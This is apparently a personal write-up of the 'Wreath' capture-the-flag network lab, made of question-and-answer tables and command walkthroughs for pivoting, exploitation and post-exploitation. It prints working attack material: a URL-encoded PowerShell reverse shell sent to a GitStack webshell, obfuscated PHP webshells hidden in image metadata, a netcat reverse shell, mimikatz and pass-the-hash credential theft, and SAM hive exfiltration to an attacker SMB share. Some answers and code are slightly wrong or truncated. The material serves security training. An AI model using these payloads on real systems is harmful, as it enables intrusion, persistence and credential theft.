# Wreath
# 30-05-2022
# little human
# level : easy

> Machine IP : `10.200.101.200`

## Enumeration


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many of the first 15000 ports are open on the target? | 4 |
| Perform a service scan on these open ports. What OS does nmap think is running ? | centos |
| Open the ip in your browser - what site does the server try to redirect you to ? | https://thomaswreath.thm/ |
| What is thomas' mobile number ? | +447821548812 |
| Look back your service scan results : what server version does the nmap detect as running here ? | MiniServ 1.890 (Webmin httpd) |
| What is the CVE number for this exploit ? | CVE-2019-15107 |



## Exploitation



| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Which user was the server running as ? | root |
| What is the root user's password hash ? | $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1 |
| What is the full path to this file ? | /root/.ssh/id_rsa |
| 

## Pivoting : High level overview


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Which type of pivoting creates a channel through which information can be sent hidden inside another protocol ? | Tunnelling |
| Which Metasploit framework meterpreter command can be used to create a port forward ? | portfwd |



## Pivoting : Enumeration

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the absolute path to the file containing DNS entries on Linux ? |
| What is the absolute path to the hosts file on Windows ? | C:\Windows\System32\drivers\etc\hosts |
| How could you see which IP address are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash ? | for i in {1..255}; do (ping -c 1 72.16.0.${i} | grep "bytes from" &); done |


## Pivoting : Proxychains & Foxyproxy

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242 ? | socks4 127.0.0.1 4242 |
| What command would you use to telnet through a proxy to 172.16.0.100:23 ? | proxychains telnet 172.16.0.100 23 |
| Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)? | FP |

## Pivoting : SSH Tunnelling / Port Forwarding   

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| If you're connection to an SSH server from your attacking machine to create a port forward, would this be a local(L) port forward or a remote(R) port forward ? | L |
| Which switch combination can be used to background an SSH port forward or tunnel ? | -fN |
| It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay ? | Nay |
| If you wnated to set up a reverse portforward from port 22 of a remote machine(172.16.0.100) to port 2222 of your local machine (172.16.0.100), using a keyfine called id_rsa and backgrounding the shell, What command would you use ? (Assume the usename is kali) | ssh -L 2222:172.16.0.100:22 kali@172.16.0.100 -i id_rsa -fN |
| What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell ? | ssh -D 8000 user@target.thm -fN |
| If you had SSH access o a server (172.16.0.50) with a webserver runniing internally on port 80(i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell. | ssh -R 8000:127.0.0.1:80 user@172.16.0.50 -fN |

## Pivoting : plink.exe

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What tool can be used to convert OpenSSH keys into PuTTY style keys ? | puttygen |




## Pivoting : Socat

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Which socat option allows you to reuse the same listening port for more than one connection ? | reuseaddr |
| If your attacking IP is 172.16.0.200, how would relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory ? | ./socat  tcp-l:8000 tcp:172.16.0.200:443 & |
| What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.200:22, using a static copy of socat in the current directory, and backgrounding the process(easy method) ? | ./socat tcp-l:2222,fork,reuseaddr 172.16.0.100:22 & |

## Pivoting : Chisel

> Reverse SOCKS Proxy : (remember to change the ports and ip as required)
> server

```
./chisel server -p 4444 --reverse &
```
> client 
```
./chisel client 10.50.102.109:4444 R:socks &
```

> Forward SOCKS Proxy : (remember to change the ports and ip as required)
> server
```
./chisel server -p 4444 --socks5
```
> client 
```
./chisel client 10.50.102.109:4444 1337:socks
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Use port 4242 for the listener and do not background the process | ./chisel server -p 4242 --reverse |
| What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process ? | ./chisel client 172.16.0.200:4242 R:socks & |
| How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process | ./chisel client 172.16.0.100:3306 R:33060:172.16.0.200:1337 & |
| If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, openning port 8000 locally and linking to 172.16.0.10:80 ? | ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80 |

## Pivoting : sshuttle

> format for sshuttle
```
sshuttle -r username@address subnet
```
> connect using the sshuttle
```
sshuttle -r user@172.16.0.5 172.16.0.0/24
```

> connection with `id_rsa` file using the sshuttle
```
sshuttle -r root@10.200.101.200 --ssh-cmd "ssh -i id_rsa" 10.200.101.0/24
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16 | sshuttle -r pwned@172.16.20.7 172.16.0.0/16 |
| What switch(and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory? | --ssh-cmd "ssh -i priv_key" |
| You are trying to use sshuttle to connect to 172.16.0.100. You want to forward the 172.16.0.x/24 range of IP address, but you are getting a Broken Pipe error. What switch(and argument) could you use to fix this error ? | -x 172.16.0.100 |

## Pivoting : Summary

* Proxychains and FoxyProxy are used to access a proxy created with one of the other tools.
* SSH can be used to create both port forwards, and proxies.
* plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows.
* Socat is a good option for redirecting connections, and can be sued to create port forwards in a variety of different ways.
* Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box.
* sshuttle is a nicer way to create a proxy when we have SSH access on a target.

## Git Server : Enumeration


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Excluding the out of scope hosts, and the current host(.200), how many hosts were discovered active on the network ? | 2 |
| in assending order, what are the last octets of these host IPv4 addresses ? | 100,150 |
| Scan the hosts - which one does not return a status of "filtered" for every port (sumit the last octet only ) | 150 |
| Which TCP ports below port 15000, are open on the remaining target ? | 80,3389,5085 |
| Assuming that the service guesses made y Nmap are accurate, which of the found service is more likely ot contain an exploitable vulnerability? | http |

## Git Server : Pivoting 

> at first we have to create a proxy to that network with a /24 (255.255.255.0) netmask. we will use sshuttle as we have the ssh access to a system into that network

```
sshuttle -r root@10.200.101.200 --ssh-cmd "ssh -i id_rsa" 255.255.255.0
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is name of the server running the service ? | gitstack |
| Do these default credentials work (Aye/Nay) ? | Nay |
| Using the `searchsploit` we will search for any vulnerabillity to that service on our kali machine. There is one python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit ? | 43777 |

## Git Server : Code Reviews

> copy the python exploit to the current directory for code review 
```
searchsploit -m 43777
```
> change the ip address to the target ip inside the python file.


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Look at the information at the top of the script. On what date was this exploit written ? | 18.01.2018 |
| Is the script written in Python2 or Python3 ? | Python2 |
| What is the name of the cookie set in the post request made on line 74(line 73 i you didn't add the shebang) of the exploit ? | csrftoken |

## Git Server : Exploitation 

> just run the python file
```
python2 43777.py
```
> after successfully running the exploit now we can run any command with curl
```
curl -X POST http://10.200.101.150/web/exploit.php -d "a=[command]"
```
> beside the above command we can also use burpsuit. just add the lines into intercepted header. and make the request type to POST
```

Content-Type: application/x-www-form-urlencoded
a=whoami

```

> starting a tcpdump listener in tun0 to see if we can ping our machine from the target machine
```
tcpdump -i tun0 icmp
```

> to get a shell connect to the ssh system and open a netcat listener 
```
firewall-cmd --zone=public --add-port 15444/tcp

./nc -lvnp 15444

```
> after the above command just run the payload (replace ip with ssh system ip and port with the above mention port) 
```
curl -X POST http://10.200.101.150/web/exploit.php -d 'a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.200.101.200%27%2C15444)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%22'

```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| First up, let's use some basic enumeration to get to grips with the webshell : What is the hostname for this target ? | GIT-SERV |
| What operating system is this target ? | Windows |
| What user is the server running as ? | NT Authority\System |
| How many ping make it to the waiting listener ? | 0 |



## Git Server : Stabilisation & Post Exploitation

> first we will add  a user to the windows machine ( using the curl command or from the newly got PowerShell)
```
net user little little /add

```
> add new user to Administrator and Remote Management Users groups 
```
net localgroup Administrators little /add
net localgroup "Remote Management Users" little /add
```

> connec with the remote desktop of windows machine from the kali machine
```
xfreerdp /v:10.200.101.150 /u:little /p:little +clipboard /drive:.,little-share
```


> after connecting just go to the shared drive and inside the PostExploitaion folder open a powershell as administrator and run the mimikatz.exe


> after the mimikatz run. we need the run the following command 
```
privilege::debug
token::elevate
```
> to see the password hashes of users
```
lsadump:sam
```


> to use evil winrm using the password hash
> syntax : `evil-winrm -u [user] -H [password hash] -i [ip]

```
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.101.150

```



| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the Administrator password hash ? | 37db630168e5f82aafa8461e05c6bbd1 |
| What is the NTLM password hash for the user "Thomax" | 02d90eda8f6b6b06c32d5f207831101f |
| What is Thomas' password ? | i<3ruby |




## Command and Controll : Empire Overview


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Can we get an agent back from the git server directly (Aye, Nay) ? | Nay |

## Command and Controll : Empire Agents


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Using the `help` command for guidance: In Empire CLI, how would we run the `whoami` command inside an agent ? | shell whoami |

## Personal PC : Enumeration

> Connect to the compromised git server
```
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.101.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network

```
> scanning the target
```
Invoke-Portscan.ps1
Get-Help Invoke-Portscan
Invoke-Portscan -Hosts 10.200.101.100 -TopPorts 50
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Scan the top 50 ports of hte last IP address you found in Task 17. Which ports are open (lowest to highest, separated by comma) | 80,3389 |

## Personal PC : Pivoting

> first we need to open a port in firewall into the git server machine (windows )
```
netsh advfirewall firewall add rule name="chisel-littlehuman" dir=in action=allow protocol=tcp localport=44444
```

> running chisel server on git server (windows)
```
./chisel server -p 44444 --socks5
```

> connecting the chisel server from local kali machine
```
./chisel client 10.200.101.150:44444 4444:socks

```

### setting up the foxyproxy
 * open foxyproxy options
 * add new proxy with ip : `127.0.0.1` port : `4444` proxy type : `socks5`
 * save the proxy and switch to that proxy
 
> now if we open the website lying on `10.200.101.100` we can see that the website now loaded

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Using the wappalyzer browser extension or an alternative method, identify the server-side Programming language (including the version number) used on the website | PHP 7.4.11 |

## Personal PC : The Wonders of Git

> downloading the `Website.git` folder from git server to local machine
```
download C:\Gitstack\Repositories\Website.git
```

> now rename internal folder to `.git` and clone the foloowing repo
```
git clone https://github.com/internetwache/GitTools
```
> now inside the `GitTools/Extractor` folder run the following command
```
./extractor.sh ../../Website.git/ ../../NewWebsite
```
> now we have a new folder `NewWebsite` in which we got all the files from the git backup


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Use Your WinRm access to look around the Git server. What is the absolute path to the website.git directory? | C:\GitStack\repositories\website.git |
| 

## Personal PC : Website Code Analysis

> 

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What does Thomas have to phone Mrs Walker about ? | neighbourhood watch meetings |
| Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page ? | basic auth |
| Whcich extension are accepted (comma separated, no spaces or quotes) ? | jpg,jpeg,png,gif |

## Personal PC : Exploit PoC

> now lets head to `/resources` and login
* username : `thomas`
* password : `i<3ruby`

> adding the exiftool data into the image file
```
mv dogo.jpeg test-littlehuman.jpeg.php
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-littlehuman.jpeg.php 

```
> now connect the foxyproxy and brows the following path from browser
```
10.200.101.100/resources/uploads/test-littlehuman.jpeg.php

```

## AV Evasion : Introduction

### There are two types of Evasion available
* On-Disk Evasion
* In-Memory Evasion

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Which category of evasion covers uploading a file to the storage on the target before executing it ? | On-Disk Evasion |
| What does AMSI stand for ? | Anti Malware Scan Interface |
| Which category of evasion does AMSI affect ? | In-Memory Evasion |



## AV Evasion : AV Detection Methods

### AV Detection Method can be clsssified into two categories
* Static Detection
* Dynamic / Heuristic / Behavioural Detection

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What other name can be used for Dynamic/Heuristic methods ? | Behavioural |
| If AV software splits a program into small chunks and hashses them, checking the results against a database, is this a static or dynamic analysis method ? | Static |
| When dynamically analysing a suspicioous file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious ? | Pre-Defined Rules |
| What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload) ? | Password |



## AV Evasion : PHP Payload Obfuscation

> php payload
```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>

```
> php obfuscation payload
```
<?php $y0=$_GET[base64_decode('d3JlYXRo')];if(isset($y0)){echo base64_decode('PHByZT4=').shell_exec($y0).base64_decode('PC9wcmU+');}die();?>

```
> use exiftool to attact the payload into a image file ( we need to escape the `$` sign)

```
exiftool -Comment="<?php \$y0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$y0)){echo base64_decode('PHByZT4=').shell_exec(\$y0).base64_decode('PC9wcmU+');}die();?>" payload.jpg.php


```
> now just upload the file as we did previous section. and browse the file from the browser using the proxy (we should attact command to the end as follows)
```
10.200.101.100/resources/uploads/payload.jpg.php?wreath=whoami
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the Host Name of the current target ? | wreath-pc |
| What is our current username (include the domain in this) | wreath-pc\thomas |




## AV Evasion : Compiling Netcat & Reverse Shell!

> compile the netcat in linux
```
git clone https://github.com/int0x33/nc.exe
cd nc.exe
rm nc*.exe
nano Makefile
```
> now add the line to the file and comment other same lines
```
CC=x86_64-w64-mingw32-gcc
```
> then just save and exit the editor and run 
```
make
```
> run a local http server 
```
python3 -m http.server 12345
```

> upload the nc.exe into the target
```
10.200.101.100/resources/uploads/payload.jpg.php?wreath=curl http://10.50.102.109:12345/nc.exe -o C:\\windows\\temp\\nc-littlehuman.exe
```
> create a local netcat listener
```
nc -lvnp 1234
```
> run the target's netcat and get a reverse shell
```
10.200.101.100/resources/uploads/payload.jpg.php?wreath=powershell.exe%20C:\\Windows\\temp\\nc-littlehuman.exe%2010.50.102.109%2012345%20-e%20cmd.exe
```


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What output do you get when running the command : certutil.exe ? | CertUtil: -dump command completed successfully. |




## AV Evasion : Enumeration
> see the privilege of current user
```
whoami /priv
```
> see groups of current user
```
whoami /groups
```
> see the services 
```
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```
> see the unquote service user account 
```
sc qc SystemExplorerHelpService
```
> see the path if it writeable
```
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```
| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
|run `whoami /priv` One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits - which privilege is this ? | SeImpersonatePrivilege |
| Notice that one of the paths does not have quotation mark around it. What is the name of this service ? | SystemExplorerHelpService |
| Is the service running as the lcoal system account(Aye/Nay) ? | Aye |

## AV Evasion : Privilege Escalation

> script for automatic reverse shell ( Wrapper.cs )
```
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            //Our code will go here!
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\te>
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}


```
> Compile the above script to get a payload
```
mcs Wrapper.cs
```

> setup a temporary SMB server on kali
```
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword

```
> connecting the SMB server from the target
```
net use \\10.50.102.109\share /USER:user s3cureP@ssword
```
> copying the file to the target 
```
copy \\10.50.102.109\share\wrapper_1234.exe %TEMP%\wrapper_1234.exe
```




## AV Evasion : Exfiltration Techniques & Post Exploitation

> Save the password hashes to SAM hive
```
reg.exe save HKLM\SAM sam.bak
```
> we can save the password hashes to our local machine using the priviously running SMB server in our local machine
```
reg.exe save HKLM\SAM \\10.50.102.109\share\wreath_pc-sam.bak
```

> dumping the system hive to our local machine
```
reg.exe save HKLM\SYSTEM \\10.50.102.109\share\wreth_pc-system.bak
```

> script to show the hashes in kali linux
```
python3 /opt/impacket/examples/secretsdump.py -sam wreath_pc-sam.bak -system wreath_pc-system.bak LOCAL
```
> save the hashes into a file called `wreath_pc-hash.txt` and run the following command to see the hashes
```
cat wreath_pc-hash.txt| cut -d ":" -f 1,4

```


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay) ? | Nay |
| For What reason is HTTPS preferred over HTTP during exfiltration ? | Encryption |
| What is the Administrator NT hash for this target ? | a05c3c807ceeb48c47252568da284cd2 |







#        THE END 
